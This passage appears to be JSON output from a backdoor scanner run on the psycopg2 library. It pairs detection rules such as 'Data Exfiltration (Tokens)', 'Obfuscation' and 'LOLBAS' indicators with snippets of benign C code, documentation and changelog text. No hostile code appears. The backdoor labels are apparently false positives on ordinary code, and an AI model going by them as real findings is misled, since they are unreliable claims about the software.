                      "text": "    PyObject *func = NULL;\n    PyObject *rv = NULL;\n\n    if (!(base64 = PyImport_ImportModule(\"base64\"))) { goto exit; }\n    if (!(func = PyObject_GetAttrString(base64, funcname))) { goto exit; }\n\n    Py_INCREF(s);\n",
                      "markdown": "`    PyObject *func = NULL;\n    PyObject *rv = NULL;\n\n    if (!(base64 = PyImport_ImportModule(\"base64\"))) { goto exit; }\n    if (!(func = PyObject_GetAttrString(base64, funcname))) { goto exit; }\n\n    Py_INCREF(s);\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/xid_type.c"
                },
                "region": {
                  "startLine": 339,
                  "startColumn": 14,
                  "endLine": 339,
                  "endColumn": 20,
                  "snippet": {
                    "text": "static PyObject *\n_xid_base64_enc_dec(const char *funcname, PyObject *s)\n{\n    PyObject *base64 = NULL;\n    PyObject *func = NULL;\n    PyObject *rv = NULL;\n\n",
                    "rendered": {
                      "text": "static PyObject *\n_xid_base64_enc_dec(const char *funcname, PyObject *s)\n{\n    PyObject *base64 = NULL;\n    PyObject *func = NULL;\n    PyObject *rv = NULL;\n\n",
                      "markdown": "`static PyObject *\n_xid_base64_enc_dec(const char *funcname, PyObject *s)\n{\n    PyObject *base64 = NULL;\n    PyObject *func = NULL;\n    PyObject *rv = NULL;\n\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/adapter_pfloat.c"
                },
                "region": {
                  "startLine": 152,
                  "startColumn": 50,
                  "endLine": 152,
                  "endColumn": 54,
                  "snippet": {
                    "text": "\n    Py_CLEAR(self->wrapped);\n\n    Dprintf(\"pfloat_dealloc: deleted pfloat object at %p, refcnt = \"\n        FORMAT_CODE_PY_SSIZE_T,\n        obj, Py_REFCNT(obj)\n      );\n",
                    "rendered": {
                      "text": "\n    Py_CLEAR(self->wrapped);\n\n    Dprintf(\"pfloat_dealloc: deleted pfloat object at %p, refcnt = \"\n        FORMAT_CODE_PY_SSIZE_T,\n        obj, Py_REFCNT(obj)\n      );\n",
                      "markdown": "`\n    Py_CLEAR(self->wrapped);\n\n    Dprintf(\"pfloat_dealloc: deleted pfloat object at %p, refcnt = \"\n        FORMAT_CODE_PY_SSIZE_T,\n        obj, Py_REFCNT(obj)\n      );\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/adapter_pfloat.c"
                },
                "region": {
                  "startLine": 138,
                  "startColumn": 45,
                  "endLine": 138,
                  "endColumn": 49,
                  "snippet": {
                    "text": "    Py_INCREF(obj);\n    self->wrapped = obj;\n\n    Dprintf(\"pfloat_setup: good pfloat object at %p, refcnt = \"\n        FORMAT_CODE_PY_SSIZE_T,\n        self, Py_REFCNT(self)\n      );\n",
                    "rendered": {
                      "text": "    Py_INCREF(obj);\n    self->wrapped = obj;\n\n    Dprintf(\"pfloat_setup: good pfloat object at %p, refcnt = \"\n        FORMAT_CODE_PY_SSIZE_T,\n        self, Py_REFCNT(self)\n      );\n",
                      "markdown": "`    Py_INCREF(obj);\n    self->wrapped = obj;\n\n    Dprintf(\"pfloat_setup: good pfloat object at %p, refcnt = \"\n        FORMAT_CODE_PY_SSIZE_T,\n        self, Py_REFCNT(self)\n      );\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/adapter_pfloat.c"
                },
                "region": {
                  "startLine": 130,
                  "startColumn": 45,
                  "endLine": 130,
                  "endColumn": 49,
                  "snippet": {
                    "text": "static int\npfloat_setup(pfloatObject *self, PyObject *obj)\n{\n    Dprintf(\"pfloat_setup: init pfloat object at %p, refcnt = \"\n        FORMAT_CODE_PY_SSIZE_T,\n        self, Py_REFCNT(self)\n      );\n",
                    "rendered": {
                      "text": "static int\npfloat_setup(pfloatObject *self, PyObject *obj)\n{\n    Dprintf(\"pfloat_setup: init pfloat object at %p, refcnt = \"\n        FORMAT_CODE_PY_SSIZE_T,\n        self, Py_REFCNT(self)\n      );\n",
                      "markdown": "`static int\npfloat_setup(pfloatObject *self, PyObject *obj)\n{\n    Dprintf(\"pfloat_setup: init pfloat object at %p, refcnt = \"\n        FORMAT_CODE_PY_SSIZE_T,\n        self, Py_REFCNT(self)\n      );\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/tools/lib/dbapi_extension.py"
                },
                "region": {
                  "startLine": 32,
                  "startColumn": 7,
                  "endLine": 32,
                  "endColumn": 13,
                  "snippet": {
                    "text": "\n    def run(self):\n        node = extension_node('\\n'.join(self.content))\n        node += nodes.title(_('DB API extension'), _('DB API extension'))\n        self.state.nested_parse(self.content, self.content_offset, node)\n        node['classes'].append('dbapi-extension')\n        return [node]\n",
                    "rendered": {
                      "text": "\n    def run(self):\n        node = extension_node('\\n'.join(self.content))\n        node += nodes.title(_('DB API extension'), _('DB API extension'))\n        self.state.nested_parse(self.content, self.content_offset, node)\n        node['classes'].append('dbapi-extension')\n        return [node]\n",
                      "markdown": "`\n    def run(self):\n        node = extension_node('\\n'.join(self.content))\n        node += nodes.title(_('DB API extension'), _('DB API extension'))\n        self.state.nested_parse(self.content, self.content_offset, node)\n        node['classes'].append('dbapi-extension')\n        return [node]\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/tools/lib/dbapi_extension.py"
                },
                "region": {
                  "startLine": 31,
                  "startColumn": 7,
                  "endLine": 31,
                  "endColumn": 13,
                  "snippet": {
                    "text": "    option_spec = {}\n\n    def run(self):\n        node = extension_node('\\n'.join(self.content))\n        node += nodes.title(_('DB API extension'), _('DB API extension'))\n        self.state.nested_parse(self.content, self.content_offset, node)\n        node['classes'].append('dbapi-extension')\n",
                    "rendered": {
                      "text": "    option_spec = {}\n\n    def run(self):\n        node = extension_node('\\n'.join(self.content))\n        node += nodes.title(_('DB API extension'), _('DB API extension'))\n        self.state.nested_parse(self.content, self.content_offset, node)\n        node['classes'].append('dbapi-extension')\n",
                      "markdown": "`    option_spec = {}\n\n    def run(self):\n        node = extension_node('\\n'.join(self.content))\n        node += nodes.title(_('DB API extension'), _('DB API extension'))\n        self.state.nested_parse(self.content, self.content_offset, node)\n        node['classes'].append('dbapi-extension')\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/connection.rst"
                },
                "region": {
                  "startLine": 542,
                  "startColumn": 7,
                  "endLine": 542,
                  "endColumn": 11,
                  "snippet": {
                    "text": "        :ref:`isolation-level-constants` for the available values.\n\n        The default level is `~psycopg2.extensions.ISOLATION_LEVEL_DEFAULT`:\n        at this level a transaction is automatically started the first time a\n        database command is executed.  If you want an *autocommit* mode,\n        switch to `~psycopg2.extensions.ISOLATION_LEVEL_AUTOCOMMIT` before\n        executing any command::\n",
                    "rendered": {
                      "text": "        :ref:`isolation-level-constants` for the available values.\n\n        The default level is `~psycopg2.extensions.ISOLATION_LEVEL_DEFAULT`:\n        at this level a transaction is automatically started the first time a\n        database command is executed.  If you want an *autocommit* mode,\n        switch to `~psycopg2.extensions.ISOLATION_LEVEL_AUTOCOMMIT` before\n        executing any command::\n",
                      "markdown": "`        :ref:`isolation-level-constants` for the available values.\n\n        The default level is `~psycopg2.extensions.ISOLATION_LEVEL_DEFAULT`:\n        at this level a transaction is automatically started the first time a\n        database command is executed.  If you want an *autocommit* mode,\n        switch to `~psycopg2.extensions.ISOLATION_LEVEL_AUTOCOMMIT` before\n        executing any command::\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/connection.rst"
                },
                "region": {
                  "startLine": 451,
                  "startColumn": 48,
                  "endLine": 451,
                  "endColumn": 52,
                  "snippet": {
                    "text": "\n        Read/write attribute: if `!True`, no transaction is handled by the\n        driver and every statement sent to the backend has immediate effect;\n        if `!False` a new transaction is started at the first command\n        execution: the methods `commit()` or `rollback()` must be manually\n        invoked to terminate the transaction.\n\n",
                    "rendered": {
                      "text": "\n        Read/write attribute: if `!True`, no transaction is handled by the\n        driver and every statement sent to the backend has immediate effect;\n        if `!False` a new transaction is started at the first command\n        execution: the methods `commit()` or `rollback()` must be manually\n        invoked to terminate the transaction.\n\n",
                      "markdown": "`\n        Read/write attribute: if `!True`, no transaction is handled by the\n        driver and every statement sent to the backend has immediate effect;\n        if `!False` a new transaction is started at the first command\n        execution: the methods `commit()` or `rollback()` must be manually\n        invoked to terminate the transaction.\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/connection.rst"
                },
                "region": {
                  "startLine": 424,
                  "startColumn": 47,
                  "endLine": 424,
                  "endColumn": 51,
                  "snippet": {
                    "text": "            Before this version, the function would have set\n            :sql:`default_transaction_*` attribute in the current session;\n            this implementation has the problem of not playing well with\n            external connection pooling working at transaction level and not\n            resetting the state of the session: changing the default\n            transaction would pollute the connections in the pool and create\n            problems to other applications using the same pool.\n",
                    "rendered": {
                      "text": "            Before this version, the function would have set\n            :sql:`default_transaction_*` attribute in the current session;\n            this implementation has the problem of not playing well with\n            external connection pooling working at transaction level and not\n            resetting the state of the session: changing the default\n            transaction would pollute the connections in the pool and create\n            problems to other applications using the same pool.\n",
                      "markdown": "`            Before this version, the function would have set\n            :sql:`default_transaction_*` attribute in the current session;\n            this implementation has the problem of not playing well with\n            external connection pooling working at transaction level and not\n            resetting the state of the session: changing the default\n            transaction would pollute the connections in the pool and create\n            problems to other applications using the same pool.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/connection.rst"
                },
                "region": {
                  "startLine": 368,
                  "startColumn": 27,
                  "endLine": 368,
                  "endColumn": 36,
                  "snippet": {
                    "text": "\n\n\n    .. rubric:: Transaction control methods and attributes.\n\n    .. index::\n        pair: Transaction; Autocommit\n",
                    "rendered": {
                      "text": "\n\n\n    .. rubric:: Transaction control methods and attributes.\n\n    .. index::\n        pair: Transaction; Autocommit\n",
                      "markdown": "`\n\n\n    .. rubric:: Transaction control methods and attributes.\n\n    .. index::\n        pair: Transaction; Autocommit\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/connection.rst"
                },
                "region": {
                  "startLine": 131,
                  "startColumn": 71,
                  "endLine": 131,
                  "endColumn": 75,
                  "snippet": {
                    "text": "\n        .. versionchanged:: 2.2\n            previously an explicit :sql:`ROLLBACK` was issued by Psycopg on\n            `!close()`. The command could have been sent to the backend at an\n            inappropriate time, so Psycopg currently relies on the backend to\n            implicitly discard uncommitted changes. Some middleware are known\n            to behave incorrectly though when the connection is closed during\n",
                    "rendered": {
                      "text": "\n        .. versionchanged:: 2.2\n            previously an explicit :sql:`ROLLBACK` was issued by Psycopg on\n            `!close()`. The command could have been sent to the backend at an\n            inappropriate time, so Psycopg currently relies on the backend to\n            implicitly discard uncommitted changes. Some middleware are known\n            to behave incorrectly though when the connection is closed during\n",
                      "markdown": "`\n        .. versionchanged:: 2.2\n            previously an explicit :sql:`ROLLBACK` was issued by Psycopg on\n            `!close()`. The command could have been sent to the backend at an\n            inappropriate time, so Psycopg currently relies on the backend to\n            implicitly discard uncommitted changes. Some middleware are known\n            to behave incorrectly though when the connection is closed during\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/connection.rst"
                },
                "region": {
                  "startLine": 849,
                  "startColumn": 61,
                  "endLine": 849,
                  "endColumn": 70,
                  "snippet": {
                    "text": "        `~psycopg2.extensions.ConnectionInfo.backend_pid`.\n\n        Returns the process ID (PID) of the backend server process *you\n        connected to*. Note that if you use a connection pool service such as\n        PgBouncer_ this value will not be updated if your connection is\n        switched to a different backend.\n\n",
                    "rendered": {
                      "text": "        `~psycopg2.extensions.ConnectionInfo.backend_pid`.\n\n        Returns the process ID (PID) of the backend server process *you\n        connected to*. Note that if you use a connection pool service such as\n        PgBouncer_ this value will not be updated if your connection is\n        switched to a different backend.\n\n",
                      "markdown": "`        `~psycopg2.extensions.ConnectionInfo.backend_pid`.\n\n        Returns the process ID (PID) of the backend server process *you\n        connected to*. Note that if you use a connection pool service such as\n        PgBouncer_ this value will not be updated if your connection is\n        switched to a different backend.\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/connection.rst"
                },
                "region": {
                  "startLine": 542,
                  "startColumn": 70,
                  "endLine": 542,
                  "endColumn": 76,
                  "snippet": {
                    "text": "        :ref:`isolation-level-constants` for the available values.\n\n        The default level is `~psycopg2.extensions.ISOLATION_LEVEL_DEFAULT`:\n        at this level a transaction is automatically started the first time a\n        database command is executed.  If you want an *autocommit* mode,\n        switch to `~psycopg2.extensions.ISOLATION_LEVEL_AUTOCOMMIT` before\n        executing any command::\n",
                    "rendered": {
                      "text": "        :ref:`isolation-level-constants` for the available values.\n\n        The default level is `~psycopg2.extensions.ISOLATION_LEVEL_DEFAULT`:\n        at this level a transaction is automatically started the first time a\n        database command is executed.  If you want an *autocommit* mode,\n        switch to `~psycopg2.extensions.ISOLATION_LEVEL_AUTOCOMMIT` before\n        executing any command::\n",
                      "markdown": "`        :ref:`isolation-level-constants` for the available values.\n\n        The default level is `~psycopg2.extensions.ISOLATION_LEVEL_DEFAULT`:\n        at this level a transaction is automatically started the first time a\n        database command is executed.  If you want an *autocommit* mode,\n        switch to `~psycopg2.extensions.ISOLATION_LEVEL_AUTOCOMMIT` before\n        executing any command::\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/connection.rst"
                },
                "region": {
                  "startLine": 897,
                  "startColumn": 13,
                  "endLine": 897,
                  "endColumn": 21,
                  "snippet": {
                    "text": "\n        Get the effective dsn parameters for the connection as a dictionary.\n\n        The *password* parameter is removed from the result.\n\n        Example::\n\n",
                    "rendered": {
                      "text": "\n        Get the effective dsn parameters for the connection as a dictionary.\n\n        The *password* parameter is removed from the result.\n\n        Example::\n\n",
                      "markdown": "`\n        Get the effective dsn parameters for the connection as a dictionary.\n\n        The *password* parameter is removed from the result.\n\n        Example::\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/connection.rst"
                },
                "region": {
                  "startLine": 363,
                  "startColumn": 13,
                  "endLine": 363,
                  "endColumn": 21,
                  "snippet": {
                    "text": "        Read-only string containing the connection string used by the\n        connection.\n\n        If a password was specified in the connection string it will be\n        obscured.\n\n\n",
                    "rendered": {
                      "text": "        Read-only string containing the connection string used by the\n        connection.\n\n        If a password was specified in the connection string it will be\n        obscured.\n\n\n",
                      "markdown": "`        Read-only string containing the connection string used by the\n        connection.\n\n        If a password was specified in the connection string it will be\n        obscured.\n\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/sql.rst"
                },
                "region": {
                  "startLine": 28,
                  "startColumn": 4,
                  "endLine": 28,
                  "endColumn": 10,
                  "snippet": {
                    "text": "        \"insert into %s values (%%s, %%s)\" % table_name,\n        [10, 20])\n\nThis sort of works, but it is an accident waiting to happen: the table name\nmay be an invalid SQL literal and need quoting; even more serious is the\nsecurity problem in case the table name comes from an untrusted source. The\nname should be escaped using `~psycopg2.extensions.quote_ident()`::\n",
                    "rendered": {
                      "text": "        \"insert into %s values (%%s, %%s)\" % table_name,\n        [10, 20])\n\nThis sort of works, but it is an accident waiting to happen: the table name\nmay be an invalid SQL literal and need quoting; even more serious is the\nsecurity problem in case the table name comes from an untrusted source. The\nname should be escaped using `~psycopg2.extensions.quote_ident()`::\n",
                      "markdown": "`        \"insert into %s values (%%s, %%s)\" % table_name,\n        [10, 20])\n\nThis sort of works, but it is an accident waiting to happen: the table name\nmay be an invalid SQL literal and need quoting; even more serious is the\nsecurity problem in case the table name comes from an untrusted source. The\nname should be escaped using `~psycopg2.extensions.quote_ident()`::\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/NEWS"
                },
                "region": {
                  "startLine": 1095,
                  "startColumn": 8,
                  "endLine": 1095,
                  "endColumn": 12,
                  "snippet": {
                    "text": "- errors from commit() and rollback() are no longer considered\n  fatal. (#194)\n- If a disconnect is detected during execute(), an exception will be\n  raised at that point rather than resulting in \"ProgrammingError:\n  no results to fetch\" later on. (#186)\n\nBetter PostgreSQL compatibility:\n",
                    "rendered": {
                      "text": "- errors from commit() and rollback() are no longer considered\n  fatal. (#194)\n- If a disconnect is detected during execute(), an exception will be\n  raised at that point rather than resulting in \"ProgrammingError:\n  no results to fetch\" later on. (#186)\n\nBetter PostgreSQL compatibility:\n",
                      "markdown": "`- errors from commit() and rollback() are no longer considered\n  fatal. (#194)\n- If a disconnect is detected during execute(), an exception will be\n  raised at that point rather than resulting in \"ProgrammingError:\n  no results to fetch\" later on. (#186)\n\nBetter PostgreSQL compatibility:\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/NEWS"
                },
                "region": {
                  "startLine": 839,
                  "startColumn": 21,
                  "endLine": 839,
                  "endColumn": 25,
                  "snippet": {
                    "text": "\n- Dropped support for protocol 2: Psycopg 2.3 can only connect to PostgreSQL\n  servers with version at least 7.4.\n- Don't issue a query at every connection to detect the client encoding\n  and to set the datestyle to ISO if it is already compatible with what\n  expected.\n- `mogrify()` now supports unicode queries.\n",
                    "rendered": {
                      "text": "\n- Dropped support for protocol 2: Psycopg 2.3 can only connect to PostgreSQL\n  servers with version at least 7.4.\n- Don't issue a query at every connection to detect the client encoding\n  and to set the datestyle to ISO if it is already compatible with what\n  expected.\n- `mogrify()` now supports unicode queries.\n",
                      "markdown": "`\n- Dropped support for protocol 2: Psycopg 2.3 can only connect to PostgreSQL\n  servers with version at least 7.4.\n- Don't issue a query at every connection to detect the client encoding\n  and to set the datestyle to ISO if it is already compatible with what\n  expected.\n- `mogrify()` now supports unicode queries.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/NEWS"
                },
                "region": {
                  "startLine": 838,
                  "startColumn": 22,
                  "endLine": 838,
                  "endColumn": 26,
                  "snippet": {
                    "text": "Other features and changes:\n\n- Dropped support for protocol 2: Psycopg 2.3 can only connect to PostgreSQL\n  servers with version at least 7.4.\n- Don't issue a query at every connection to detect the client encoding\n  and to set the datestyle to ISO if it is already compatible with what\n  expected.\n",
                    "rendered": {
                      "text": "Other features and changes:\n\n- Dropped support for protocol 2: Psycopg 2.3 can only connect to PostgreSQL\n  servers with version at least 7.4.\n- Don't issue a query at every connection to detect the client encoding\n  and to set the datestyle to ISO if it is already compatible with what\n  expected.\n",
                      "markdown": "`Other features and changes:\n\n- Dropped support for protocol 2: Psycopg 2.3 can only connect to PostgreSQL\n  servers with version at least 7.4.\n- Don't issue a query at every connection to detect the client encoding\n  and to set the datestyle to ISO if it is already compatible with what\n  expected.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/NEWS"
                },
                "region": {
                  "startLine": 771,
                  "startColumn": 11,
                  "endLine": 771,
                  "endColumn": 15,
                  "snippet": {
                    "text": "- Improvements to the named cursors:\n\n  - More efficient iteration on named cursors, fetching 'itersize'\n    records at time from the backend.\n  - The named cursors name can be an invalid identifier.\n\n- Improvements in data handling:\n",
                    "rendered": {
                      "text": "- Improvements to the named cursors:\n\n  - More efficient iteration on named cursors, fetching 'itersize'\n    records at time from the backend.\n  - The named cursors name can be an invalid identifier.\n\n- Improvements in data handling:\n",
                      "markdown": "`- Improvements to the named cursors:\n\n  - More efficient iteration on named cursors, fetching 'itersize'\n    records at time from the backend.\n  - The named cursors name can be an invalid identifier.\n\n- Improvements in data handling:\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/NEWS"
                },
                "region": {
                  "startLine": 719,
                  "startColumn": 33,
                  "endLine": 719,
                  "endColumn": 37,
                  "snippet": {
                    "text": "  connection. Added support for read-only sessions and, for PostgreSQL\n  9.1, for the \"repeatable read\" isolation level and the \"deferrable\"\n  transaction property.\n- Psycopg doesn't execute queries at connection time to find the\n  default isolation level.\n- Fixed bug with multithread code potentially causing loss of sync\n  with the server communication or lock of the client (:ticket:`#55`).\n",
                    "rendered": {
                      "text": "  connection. Added support for read-only sessions and, for PostgreSQL\n  9.1, for the \"repeatable read\" isolation level and the \"deferrable\"\n  transaction property.\n- Psycopg doesn't execute queries at connection time to find the\n  default isolation level.\n- Fixed bug with multithread code potentially causing loss of sync\n  with the server communication or lock of the client (:ticket:`#55`).\n",
                      "markdown": "`  connection. Added support for read-only sessions and, for PostgreSQL\n  9.1, for the \"repeatable read\" isolation level and the \"deferrable\"\n  transaction property.\n- Psycopg doesn't execute queries at connection time to find the\n  default isolation level.\n- Fixed bug with multithread code potentially causing loss of sync\n  with the server communication or lock of the client (:ticket:`#55`).\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/NEWS"
                },
                "region": {
                  "startLine": 620,
                  "startColumn": 9,
                  "endLine": 620,
                  "endColumn": 13,
                  "snippet": {
                    "text": "- Dropped support for Python 2.4. Please use Psycopg 2.4.x if you need it.\n- `~psycopg2.errorcodes` map updated to PostgreSQL 9.2.\n- Dropped Zope adapter from source repository. ZPsycopgDA now has its own\n  project at <https://github.com/psycopg/ZPsycopgDA>.\n\n\nWhat's new in psycopg 2.4.6\n",
                    "rendered": {
                      "text": "- Dropped support for Python 2.4. Please use Psycopg 2.4.x if you need it.\n- `~psycopg2.errorcodes` map updated to PostgreSQL 9.2.\n- Dropped Zope adapter from source repository. ZPsycopgDA now has its own\n  project at <https://github.com/psycopg/ZPsycopgDA>.\n\n\nWhat's new in psycopg 2.4.6\n",
                      "markdown": "`- Dropped support for Python 2.4. Please use Psycopg 2.4.x if you need it.\n- `~psycopg2.errorcodes` map updated to PostgreSQL 9.2.\n- Dropped Zope adapter from source repository. ZPsycopgDA now has its own\n  project at <https://github.com/psycopg/ZPsycopgDA>.\n\n\nWhat's new in psycopg 2.4.6\n`"
                    }
                  },
